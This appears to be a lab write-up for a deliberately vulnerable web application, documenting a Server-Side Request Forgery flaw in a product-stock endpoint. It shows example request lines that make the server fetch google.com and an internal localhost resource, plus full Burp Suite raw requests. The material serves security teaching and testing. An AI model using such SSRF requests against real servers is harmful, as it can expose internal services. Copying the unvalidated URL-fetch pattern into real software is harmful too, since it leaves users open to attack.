# Server-Side Request Forgery (SSRF)
Server-side Request Forgery (SSRF) attack triggers the web application to perform requests for you.  This could be against the web application itself, website internally located resources, external systems on the infrastructure and more!

## Exploitation
**Prerequisites:** _None_

**Location:** _GET /products/stock/?url=...&id=..._

While the Angular application by default fetches the product stock by using the url parameter to specify _http://localhost:8081/products/stock/?id=ID_, a redirect to the same endpoint acting as a substitute for an external service, it can be manipulated to fetch alternative resources.  Below are two exploitation examples, one fetching an external webpage and the other fetching an internal resource:

    # Fetching external resource, google homepage
    GET /products/stock?url=http://google.com

    # Fetching internal resource, product information
    GET /products/stock?url=http://localhost:8081/products/1


Successful exploitation looks like:

    null ...

## Burp Suite Example Exploitation

    # First Request
    GET /products/stock?url=http://google.com HTTP/1.1
    Host: 127.0.0.1:8081
    sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
    Accept: application/json, text/plain, */*
    X-XSRF-TOKEN: 687cd1a5-41b1-4218-abb6-84922b321d2d
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
    sec-ch-ua-platform: "Windows"
    Origin: http://127.0.0.1:4200
    Sec-Fetch-Site: same-site
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://127.0.0.1:4200/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: XSRF-TOKEN=687cd1a5-41b1-4218-abb6-84922b321d2d; JSESSIONID=0DDDF48C1816DB9F1C48FB29C3EE9774
    Connection: close

    # Second Request
    GET /products/stock?url=http://localhost:8081/products/1 HTTP/1.1
    Host: 127.0.0.1:8081
    sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
    Accept: application/json, text/plain, */*
    X-XSRF-TOKEN: 687cd1a5-41b1-4218-abb6-84922b321d2d
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
    sec-ch-ua-platform: "Windows"
    Origin: http://127.0.0.1:4200
    Sec-Fetch-Site: same-site
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://127.0.0.1:4200/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: XSRF-TOKEN=687cd1a5-41b1-4218-abb6-84922b321d2d; JSESSIONID=0DDDF48C1816DB9F1C48FB29C3EE9774
    Connection: close



